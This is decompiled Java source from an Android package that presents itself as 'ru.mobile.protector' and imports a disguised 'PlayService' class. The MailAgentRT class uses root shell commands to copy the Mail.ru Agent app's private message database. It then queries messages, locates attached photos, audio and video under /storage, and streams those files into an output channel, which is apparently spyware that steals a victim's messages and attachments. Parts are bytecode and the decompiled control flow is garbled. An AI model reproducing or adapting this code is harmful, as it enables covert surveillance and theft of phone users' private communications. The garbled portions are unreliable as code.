package ru.mobile.protector;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import com.android.location.PlayService;
import java.io.File;
import java.io.OutputStream;

public class MailAgentRT
{
  private static final byte ATTACH_PACKET = 99;
  private static final byte END_OF_BLOCK = 2;
  private static final byte END_OF_FIELD = 1;
  private static final byte END_OF_LINE = 3;
  private static final byte MAIL_AGENT_ATTACH_ID = 13;
  private static String appDBMessages;
  private static String appDBPath;
  private static String appFilesPath;
  private static final String maDBPath = "/data/data/ru.mail/databases/";
  private static final String maDbMessages = "agent-dao";
  
  public MailAgentRT() {}
  
  private static void AddData(OutputStream paramOutputStream, String paramString)
  {
    if (paramOutputStream == null) {
      return;
    }
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    if (str != null) {}
    try
    {
      paramOutputStream.write(str.getBytes());
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData");
        return;
      }
      try
      {
        paramOutputStream.write(1);
        throw paramString;
      }
      catch (Exception paramOutputStream)
      {
        for (;;)
        {
          EXCEPT(paramOutputStream, "AddData");
        }
      }
    }
    catch (Exception paramString)
    {
      paramString = paramString;
      EXCEPT(paramString, "AddData");
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData");
        return;
      }
    }
    finally {}
  }
  
  private static void EXCEPT(Exception paramException, String paramString)
  {
    Log.v("gg", paramString);
    paramException.printStackTrace();
  }
  
  private static void FLOG(String paramString)
  {
    PlayService.FLOG(paramString);
  }
  
  public static long ReadFile(Context paramContext, OutputStream paramOutputStream, long paramLong)
  {
    FLOG("1 " + paramLong);
    long l = 0L;
    appDBPath = "/data/data/" + paramContext.getPackageName() + "/databases/";
    appFilesPath = "/data/data/" + paramContext.getPackageName() + "/files/";
    paramContext = null;
    Object localObject1 = paramContext;
    for (;;)
    {
      Cursor localCursor;
      try
      {
        if (!copyDB()) {
          break label794;
        }
        localObject1 = paramContext;
        FLOG("db: " + appDBMessages);
        localObject1 = paramContext;
        Object localObject2 = SQLiteDatabase.openDatabase(appDBMessages, null, 0);
        localObject1 = paramContext;
        localCursor = ((SQLiteDatabase)localObject2).rawQuery("SELECT TIMESTAMP, DATA FROM MESSAGE WHERE TIMESTAMP > " + 1000L * paramLong + " ORDER BY TIMESTAMP", null);
        if (localCursor == null) {
          break label779;
        }
        localObject1 = localCursor;
        if (!localCursor.moveToFirst()) {
          break label764;
        }
        localObject1 = localCursor;
        paramLong = localCursor.getLong(localCursor.getColumnIndex("TIMESTAMP")) / 1000L;
        localObject1 = localCursor;
        if (!localCursor.isNull(localCursor.getColumnIndex("DATA")))
        {
          localObject1 = localCursor;
          paramContext = getUriFromData(new String(localCursor.getBlob(localCursor.getColumnIndex("DATA")), "UTF-8"));
          localObject1 = localCursor;
          if (!paramContext.equals(""))
          {
            localObject1 = localCursor;
            FLOG("___________________________________________");
            localObject1 = localCursor;
            FLOG("filePath: " + paramContext);
            localObject1 = localCursor;
            File localFile = new File(paramContext);
            localObject1 = localCursor;
            if (localFile.exists())
            {
              localObject1 = localCursor;
              FLOG("writing to fo");
              paramContext = "application/zip";
              localObject1 = localCursor;
              localObject2 = getFileExtention(localFile.getName());
              localObject1 = localCursor;
              if (((String)localObject2).equals("mpeg")) {
                break label805;
              }
              localObject1 = localCursor;
              if (((String)localObject2).equals("mp3"))
              {
                break label805;
                localObject1 = localCursor;
                paramOutputStream.write(99);
                localObject1 = localCursor;
                AddData(paramOutputStream, String.valueOf(paramLong));
                localObject1 = localCursor;
                AddData(paramOutputStream, Integer.toString(13));
                localObject1 = localCursor;
                AddData(paramOutputStream, paramContext);
                localObject1 = localCursor;
                AddData(paramOutputStream, localFile.getName());
                localObject1 = localCursor;
                AddData(paramOutputStream, String.valueOf(localFile.length()));
                localObject1 = localCursor;
                writeFileToOutputStream(paramOutputStream, localFile);
                localObject1 = localCursor;
                paramOutputStream.write(1);
                localObject1 = localCursor;
                paramOutputStream.write(3);
                localObject1 = localCursor;
                paramOutputStream.write(2);
                return paramLong;
              }
              localObject1 = localCursor;
              if (((String)localObject2).equals("png")) {
                break label811;
              }
              localObject1 = localCursor;
              if (((String)localObject2).equals("img")) {
                break label811;
              }
              localObject1 = localCursor;
              if (((String)localObject2).equals("jpg")) {
                break label811;
              }
              localObject1 = localCursor;
              if (((String)localObject2).equals("jpeg")) {
                break label811;
              }
              localObject1 = localCursor;
              if (((String)localObject2).equals("bmp")) {
                break label811;
              }
              localObject1 = localCursor;
              if (((String)localObject2).equals("png")) {
                break label817;
              }
              localObject1 = localCursor;
              if (((String)localObject2).equals("img")) {
                break label817;
              }
              localObject1 = localCursor;
              if (!((String)localObject2).equals("jpg")) {
                continue;
              }
              break label817;
            }
            localObject1 = localCursor;
            FLOG("no file");
            localObject1 = localCursor;
            if (localCursor.moveToNext()) {
              continue;
            }
            localObject1 = localCursor;
            if (!localCursor.isClosed())
            {
              localObject1 = localCursor;
              localCursor.close();
            }
            localObject1 = localCursor;
            l = paramLong;
            if (!((SQLiteDatabase)localObject2).isOpen()) {
              break;
            }
            localObject1 = localCursor;
            ((SQLiteDatabase)localObject2).close();
            l = paramLong;
            break;
          }
          localObject1 = localCursor;
          FLOG("no path in db");
          continue;
        }
        localObject1 = localCursor;
      }
      catch (Exception paramContext)
      {
        EXCEPT(paramContext, "Read");
        if ((localObject1 != null) && (!((Cursor)localObject1).isClosed())) {
          ((Cursor)localObject1).close();
        }
        return 0L;
      }
      FLOG("no files");
      continue;
      label764:
      localObject1 = localCursor;
      FLOG("0 rows");
      paramLong = l;
      continue;
      label779:
      localObject1 = localCursor;
      FLOG("Failed to open");
      paramLong = l;
      continue;
      label794:
      localObject1 = paramContext;
      FLOG("Failed to copy database");
      break;
      label805:
      paramContext = "audio/mpeg";
      continue;
      label811:
      paramContext = "image/jpeg";
      continue;
      label817:
      paramContext = "video/3gpp";
    }
    return l;
  }
  
  /* Error */
  public static byte commandSU(String paramString)
  {
    // Byte code:
    //   0: invokestatic 271	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore 5
    //   5: aconst_null
    //   6: astore 6
    //   8: aconst_null
    //   9: astore 9
    //   11: aconst_null
    //   12: astore 8
    //   14: iconst_0
    //   15: istore_1
    //   16: aload 5
    //   18: ldc_w 273
    //   21: invokevirtual 277	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   24: astore 5
    //   26: aload 5
    //   28: astore 6
    //   30: new 279	java/io/OutputStreamWriter
    //   33: dup
    //   34: aload 5
    //   36: invokevirtual 285	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   39: invokespecial 288	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   42: astore 7
    //   44: aload 7
    //   46: aload_0
    //   47: invokevirtual 290	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   50: aload 7
    //   52: invokevirtual 293	java/io/OutputStreamWriter:flush	()V
    //   55: aload 7
    //   57: invokevirtual 294	java/io/OutputStreamWriter:close	()V
    //   60: aload 7
    //   62: ifnull +151 -> 213
    //   65: aload 7
    //   67: invokevirtual 294	java/io/OutputStreamWriter:close	()V
    //   70: aload 5
    //   72: astore_0
    //   73: aload_0
    //   74: ifnull +24 -> 98
    //   77: bipush 30
    //   79: istore_3
    //   80: iload_3
    //   81: iconst_1
    //   82: isub
    //   83: istore 4
    //   85: iload_3
    //   86: ifgt +81 -> 167
    //   89: iload 4
    //   91: ifgt +7 -> 98
    //   94: aload_0
    //   95: invokevirtual 297	java/lang/Process:destroy	()V
    //   98: iload_1
    //   99: ireturn
    //   100: astore_0
    //   101: aload 6
    //   103: astore 5
    //   105: aload 8
    //   107: astore 6
    //   109: iconst_1
    //   110: istore_2
    //   111: aload 5
    //   113: astore_0
    //   114: iload_2
    //   115: istore_1
    //   116: aload 6
    //   118: ifnull -45 -> 73
    //   121: aload 6
    //   123: invokevirtual 294	java/io/OutputStreamWriter:close	()V
    //   126: aload 5
    //   128: astore_0
    //   129: iload_2
    //   130: istore_1
    //   131: goto -58 -> 73
    //   134: astore_0
    //   135: aload 5
    //   137: astore_0
    //   138: iload_2
    //   139: istore_1
    //   140: goto -67 -> 73
    //   143: astore_0
    //   144: aload 9
    //   146: astore 5
    //   148: aload 5
    //   150: ifnull +8 -> 158
    //   153: aload 5
    //   155: invokevirtual 294	java/io/OutputStreamWriter:close	()V
    //   158: aload_0
    //   159: athrow
    //   160: astore_0
    //   161: aload 5
    //   163: astore_0
    //   164: goto -91 -> 73
    //   167: aload_0
    //   168: invokevirtual 301	java/lang/Process:exitValue	()I
    //   171: pop
    //   172: goto -83 -> 89
    //   175: astore 5
    //   177: ldc2_w 302
    //   180: invokestatic 309	java/lang/Thread:sleep	(J)V
    //   183: iload 4
    //   185: istore_3
    //   186: goto -106 -> 80
    //   189: astore_0
    //   190: iconst_3
    //   191: ireturn
    //   192: astore 5
    //   194: goto -36 -> 158
    //   197: astore_0
    //   198: aload 7
    //   200: astore 5
    //   202: goto -54 -> 148
    //   205: astore_0
    //   206: aload 7
    //   208: astore 6
    //   210: goto -101 -> 109
    //   213: aload 5
    //   215: astore_0
    //   216: goto -143 -> 73
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	219	0	paramString	String
    //   15	125	1	b1	byte
    //   110	29	2	b2	byte
    //   79	107	3	i	int
    //   83	101	4	j	int
    //   3	159	5	localObject1	Object
    //   175	1	5	localIllegalThreadStateException	IllegalThreadStateException
    //   192	1	5	localIOException	java.io.IOException
    //   200	14	5	localObject2	Object
    //   6	203	6	localObject3	Object
    //   42	165	7	localOutputStreamWriter	java.io.OutputStreamWriter
    //   12	94	8	localObject4	Object
    //   9	136	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   16	26	100	java/io/IOException
    //   30	44	100	java/io/IOException
    //   121	126	134	java/io/IOException
    //   16	26	143	finally
    //   30	44	143	finally
    //   65	70	160	java/io/IOException
    //   167	172	175	java/lang/IllegalThreadStateException
    //   94	98	189	java/lang/InterruptedException
    //   167	172	189	java/lang/InterruptedException
    //   177	183	189	java/lang/InterruptedException
    //   153	158	192	java/io/IOException
    //   44	60	197	finally
    //   44	60	205	java/io/IOException
  }
  
  private static boolean copyDB()
  {
    File localFile = new File(appDBPath);
    if (!localFile.exists()) {
      localFile.mkdirs();
    }
    localFile = new File(appFilesPath);
    if (!localFile.exists()) {
      localFile.mkdirs();
    }
    if (!new File("/data/data/ru.mail/databases/").exists())
    {
      FLOG("mAgent folder not found");
      return false;
    }
    commandSU("cat /data/data/ru.mail/databases/agent-dao > " + appDBPath + "ma_messages.db");
    appDBMessages = appDBPath + "ma_messages.db";
    commandSU("chmod 666 " + appDBMessages);
    return new File(appDBMessages).exists();
  }
  
  public static String getFileExtention(String paramString)
  {
    return paramString.substring(paramString.lastIndexOf(".") + 1);
  }
  
  private static String getUriFromData(String paramString)
  {
    for (;;)
    {
      int i;
      try
      {
        paramString = paramString.substring(paramString.indexOf("/storage"), paramString.length());
        int j = 0;
        i = 0;
        int k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == 0) {
            return "";
          }
        }
        else
        {
          if ((byte)paramString.charAt(i) != 0) {
            break label64;
          }
          continue;
        }
        paramString = paramString.substring(0, i);
        return paramString;
      }
      catch (IndexOutOfBoundsException paramString)
      {
        return "";
      }
      label64:
      i += 1;
    }
  }
  
  /* Error */
  private static void writeFileToOutputStream(OutputStream paramOutputStream, File paramFile)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: new 351	java/io/FileInputStream
    //   8: dup
    //   9: aload_1
    //   10: invokespecial 354	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   13: astore_1
    //   14: sipush 4096
    //   17: newarray byte
    //   19: astore_3
    //   20: aload_1
    //   21: aload_3
    //   22: invokevirtual 358	java/io/FileInputStream:read	([B)I
    //   25: istore_2
    //   26: iload_2
    //   27: ifgt +12 -> 39
    //   30: aload_1
    //   31: ifnull +60 -> 91
    //   34: aload_1
    //   35: invokevirtual 359	java/io/FileInputStream:close	()V
    //   38: return
    //   39: aload_0
    //   40: aload_3
    //   41: iconst_0
    //   42: iload_2
    //   43: invokevirtual 362	java/io/OutputStream:write	([BII)V
    //   46: goto -26 -> 20
    //   49: astore_0
    //   50: aload_1
    //   51: ifnull -13 -> 38
    //   54: aload_1
    //   55: invokevirtual 359	java/io/FileInputStream:close	()V
    //   58: return
    //   59: astore_0
    //   60: return
    //   61: astore_0
    //   62: aload_3
    //   63: astore_1
    //   64: aload_1
    //   65: ifnull +7 -> 72
    //   68: aload_1
    //   69: invokevirtual 359	java/io/FileInputStream:close	()V
    //   72: aload_0
    //   73: athrow
    //   74: astore_0
    //   75: return
    //   76: astore_1
    //   77: goto -5 -> 72
    //   80: astore_0
    //   81: goto -17 -> 64
    //   84: astore_0
    //   85: aload 4
    //   87: astore_1
    //   88: goto -38 -> 50
    //   91: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	92	0	paramOutputStream	OutputStream
    //   0	92	1	paramFile	File
    //   25	18	2	i	int
    //   1	62	3	arrayOfByte	byte[]
    //   3	83	4	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   14	20	49	java/lang/Exception
    //   20	26	49	java/lang/Exception
    //   39	46	49	java/lang/Exception
    //   54	58	59	java/io/IOException
    //   5	14	61	finally
    //   34	38	74	java/io/IOException
    //   68	72	76	java/io/IOException
    //   14	20	80	finally
    //   20	26	80	finally
    //   39	46	80	finally
    //   5	14	84	java/lang/Exception
  }
}
